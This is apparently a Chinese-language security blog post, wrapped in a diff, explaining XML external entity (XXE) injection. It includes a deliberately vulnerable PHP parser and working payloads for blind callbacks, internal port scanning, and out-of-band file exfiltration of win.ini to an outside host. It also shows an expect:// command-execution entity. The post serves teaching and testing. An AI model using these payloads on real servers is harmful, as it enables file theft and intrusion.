@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-157457995-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>
+      
+  Web安全漏洞系列 —— XXE &ndash; Arefu&#39;s Playground
+
+    </title>
+    
+    
+    <meta name="description" property="og:description" content="XXE出现在服务器接受外部XML输入，XML的外部实体令XML注入增色不少。
+|blog under go1f.cc">
+    
+
+    <meta name="apple-mobile-web-app-title" content="Arefu&#39;s Playground">
+    
+    
+    <link rel="icon" href="/favicon-64.png">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    <link rel="mask-icon" size="any" href="/pinned-icon.svg">
+    
+    
+    
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@">
+    <meta name="twitter:creator" content="@">
+    <meta name="twitter:title" content="Web安全漏洞系列 —— XXE | Arefu&#39;s Playground">
+    <meta name="twitter:description" content="XXE出现在服务器接受外部XML输入，XML的外部实体令XML注入增色不少。|blog under go1f.cc">
+    <meta name="twitter:image" content="https://blog.go1f.cc/twitter-card.png">
+    
+
+
+    <link rel="stylesheet" href="/assets/syntax.css">
+    <link rel="stylesheet" href="/assets/primer-build.css">
+    <link rel="stylesheet" href="/assets/style.css">
+  </head>
+
+
+  <body class="bg-gray">
+    <div id="holy" class="container-lg bg-white h-100">
+
+      <div id="header" class="px-1 bg-white">
+        <nav class="UnderlineNav UnderlineNav--right px-2">
+  <a class="UnderlineNav-actions muted-link h2" href="https://blog.go1f.cc/">
+    Arefu&#39;s Playground
+  </a>
+
+  
+  
+  <div class="UnderlineNav-body">
+    
+    
+    
+    <a class="UnderlineNav-item " href="/">
+      
+      <span>Board</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/notes/">
+      
+      <span>Notes</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/blog/">
+      
+      <span>Blog</span>
+    </a>
+    
+    
+  </div>
+  
+</nav>
+
+      </div>
+
+      <div role="main" id="main" class="holy-main markdown-body px-4 bg-white">
+        
+
+<div class="Subhead">
+  <div class="Subhead-heading">
+    <div class="h1 mt-3 mb-1">Web安全漏洞系列 —— XXE</div>
+  </div>
+  <div class="Subhead-description">
+    
+
+
+<a href='/categories/web%E5%AE%89%E5%85%A8' class="muted-link">
+  <span class="Label Label--gray-darker">Web安全</span>
+</a>
+
+
+
+<a href='/tags/xxe' class="muted-link">
+  <span class="Label Label--gray">XXE</span>
+</a>
+
+
+
+    
+    <div class="float-md-right">
+      <span title="Lastmod: 2020-02-16. Published at: 2020-02-15.">
+        
+          Lastmod: 2020-02-16
+        
+      </span>
+    </div>
+    
+  </div>
+</div>
+<article>
+  
+  <section class="pb-6 mb-3 border-bottom">
+    <p>XXE出现在服务器接受外部XML输入，XML的外部实体令XML注入增色不少。</p>
+<h2 id="xml">XML</h2>
+<p>XML(可拓展标记语言 eXtensible Markup Language)， 设计用于<strong>传输</strong>和存储数据；HTML，则设计用来显示数据，焦点为数据的外观。</p>
+<p>​</p>
+<p><strong>格式</strong></p>
+<div class="highlight"><pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span class="c">&lt;!--</span><span class="c"> 首行定义版本 编码 </span><span class="c">--&gt;</span>
+
+<span class="c">&lt;!--</span><span class="c"> 根元素与子元素 </span><span class="c">--&gt;</span>
+<span class="nt">&lt;test</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;name</span><span class="nt">&gt;</span>内容<span class="nt">&lt;/name&gt;</span>
+<span class="nt">&lt;/test&gt;</span>
+</code></pre></div><p>​</p>
+<h2 id="dtd">DTD</h2>
+<p>DTD(document type definition) 用于约束XML文档结构，可以声明在XML文档内，也可以外部引用。</p>
+<p>DTD 需要包装在一个 DOCTYPE 声明</p>
+<pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;!DOCTYPE test [
+	&lt;!-- 元素声明 --&gt;
+	&lt;!ENTITY value &quot;This is a test&quot;&gt;
+]&gt;
+</code></pre><p>PS：一个单独DTD文件，不需要写DOCTYPE声明，因为XML外部引用该DTD文件时，已经有DOCTYPE。</p>
+<p>​</p>
+<p><strong>普通实体</strong></p>
+<p>上面例子定义的普通实体，以 <code>&amp;&lt;name&gt;;</code>格式引用</p>
+<pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;content&gt;&amp;value;&lt;/content&gt;
+</code></pre><p><strong>参数实体</strong></p>
+<p>只在DTD内或元素的声明中使用，将实体的文本替换为实体引用，以 <code>%name;</code> 格式引用，注意ENTITY内定义带空格 <code>%空格name</code>，引用时不带空格 <code>%name;</code></p>
+<pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;!ENTITY % area &quot;name, street, pincode, city&quot;&gt;
+&lt;!ENTITY % contact &quot;phone&quot;&gt;
+
+&lt;!ELEMENT office (%area;, %contact;)&gt;
+</code></pre><p>​</p>
+<h2 id="外部实体">外部实体</h2>
+<pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;!ENTITY aname SYSTEM &quot;URL/URI&quot;&gt;
+</code></pre><p>可使用伪协议，<code>file:///</code>或 <code>php://filter</code>等</p>
+<p>引入外部实体DTD文件，注意需要符合DTD规范</p>
+<pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;!DOCTYPE 根元素 [
+    &lt;!ENTITY % ext SYSTEM &quot;URL/URI&quot;&gt;
+    %ext;
+]&gt;
+</code></pre><p>然而，现代浏览器不支持实体外部引用了（IE还可以），这时，需要php主动解析XML，见下例。</p>
+<p>​</p>
+<h2 id="示例">示例</h2>
+<h3 id="环境搭建">环境搭建</h3>
+<p>环境复现可能需要开启php_study扩展： php_xmlrpc</p>
+<p>关键函数：<code> simplexml_load_string()</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+	<span class="nx">libxml_disable_entity_loader</span><span class="p">(</span><span class="k">false</span><span class="p">);</span>
+	<span class="nv">$data</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;php://input&#39;</span><span class="p">);</span>
+	<span class="nv">$xml</span> <span class="o">=</span> <span class="nx">simplexml_load_string</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+	<span class="nx">print_r</span><span class="p">(</span><span class="nv">$xml</span><span class="p">);</span>
+	<span class="c1">//输出仅为测试使用，实战大多没有回显
+</span><span class="c1"></span><span class="cp">?&gt;</span>
+</code></pre></div><p>​</p>
+<h3 id="blind-xee">Blind XEE</h3>
+<p>检查服务器日志/<a href="ceye.payload">XXE接受平台</a>有无请求记录，成功就能接着玩了。</p>
+<pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding='utf-8'?&gt;     
+&lt;!DOCTYPE payload [
+	&lt;!ENTITY test SYSTEM &quot;http://attack.com?message=test&quot;&gt;
+]&gt;   
+&lt;payload&gt;&amp;test;&lt;/payload&gt;
+</code></pre><p><img src="https://i.loli.net/2020/02/16/gvB7VRDZJtk6Pm4.jpg" alt="XXE Blind.jpg"></p>
+<p>​</p>
+<h3 id="内网探测端口扫描">内网探测+端口扫描</h3>
+<p>配合burp的intruder模块</p>
+<pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding='utf-8'?&gt; 
+&lt;!DOCTYPE test [
+	&lt;!ENTITY scan SYSTEM &quot;http://192.168.5.5:8080&quot;&gt;
+]&gt;
+&lt;test&gt;&amp;scan;&lt;/test&gt;
+</code></pre><h3 id="任意文件读取">任意文件读取</h3>
+<p>加载外部DTD</p>
+<pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding='utf-8'?&gt;     
+&lt;!DOCTYPE payload [
+	&lt;!ENTITY % xxe SYSTEM &quot;http://go1f.cc:81/payload.dtd&quot;&gt;
+	%xxe;
+]&gt;
+&lt;payload&gt;&amp;txt;&lt;/payload&gt;
+</code></pre><p>​</p>
+<p><strong>payload.dtd构造</strong></p>
+<pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;!ENTITY txt SYSTEM &quot;php://filter/read=convert.base64-encode/resource=c:/windows/win.ini&quot;&gt;
+
+&lt;!ENTITY % payload SYSTEM &quot;php://filter/read=convert.base64-encode/resource=c:/windows/win.ini&quot;&gt;
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; trick SYSTEM 'http://go1f.cc:8000/%payload;'&gt;&quot;&gt;
+%int;
+%trick;
+</code></pre><p>攻击服务器开启8000端口监听
+<img src="https://i.loli.net/2020/02/16/KB3kYwZ5cnEzWgM.jpg" alt="nc_XXE.jpg"></p>
+<p>​</p>
+<p><img src="https://i.loli.net/2020/02/16/FMi317mWJQ8ZjOf.jpg" alt="XXE response.jpg"></p>
+<p>​</p>
+<h3 id="命令执行">命令执行</h3>
+<p>需要 expect 扩展</p>
+<pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;!ENTITY xee SYSTEM &quot;expect://command&quot;&gt;
+</code></pre><p>​</p>
+<h2 id="参考文章">参考文章</h2>
+<p><a href="https://www.freebuf.com/vuls/175451.html">浅谈XML实体注入漏洞</a></p>
+<p>XXE攻击实例查找(fofa.so\ shodan.io)</p>
+<pre><code>header=text/xml
+</code></pre>
+  </section>
+
+  <section>
+    
+      
+    
+  </section>
+</article>
+
+      </div>
+
+      <div id="side" class="pr-1 bg-white">
+        <aside class="pr-3">
+          
+  
+    <div id="toc" class="Box Box--blue mb-3">
+      <b>Web安全漏洞系列 —— XXE</b><nav id="TableOfContents">
+  <ul>
+    <li><a href="#xml">XML</a></li>
+    <li><a href="#dtd">DTD</a></li>
+    <li><a href="#外部实体">外部实体</a></li>
+    <li><a href="#示例">示例</a>
+      <ul>
+        <li><a href="#环境搭建">环境搭建</a></li>
+        <li><a href="#blind-xee">Blind XEE</a></li>
+        <li><a href="#内网探测端口扫描">内网探测+端口扫描</a></li>
+        <li><a href="#任意文件读取">任意文件读取</a></li>
+        <li><a href="#命令执行">命令执行</a></li>
+      </ul>
+    </li>
+    <li><a href="#参考文章">参考文章</a></li>
+  </ul>
+</nav></div>
+  
+
+  
+    
+    
+      <div>
+        
+
+        
+
+        
+
+        
+          <a data-pocket-label="pocket" data-pocket-count="none" class="pocket-btn" data-lang="en"></a>
+          <script type="text/javascript">!function(d,i){if(!d.getElementById(i)){var j=d.createElement("script");j.id=i;j.src="https://widgets.getpocket.com/v1/j/btn.js?v=1";var w=d.getElementById(i);d.body.appendChild(j);}}(document,"pocket-btn-js");</script>
+        
+
+      </div>
+    
+  
+
+        </aside>
+      </div>
+
+      <div id="footer" class="pt-2 pb-3 bg-white text-center">
+        
+
+  <span class="text-small text-gray">
+    ©go1f 2020 &middot; 
+
+    Powered by the
+    <a href="https://github.com/qqhann/hugo-primer" class="link-gray-dark">Hugo-Primer</a> theme for
+    <a href="https://gohugo.io" class="link-gray-dark">Hugo</a>.
+  </span>
+
+
+      </div>
+    </div>
+
+    
+  </body>
+</html>
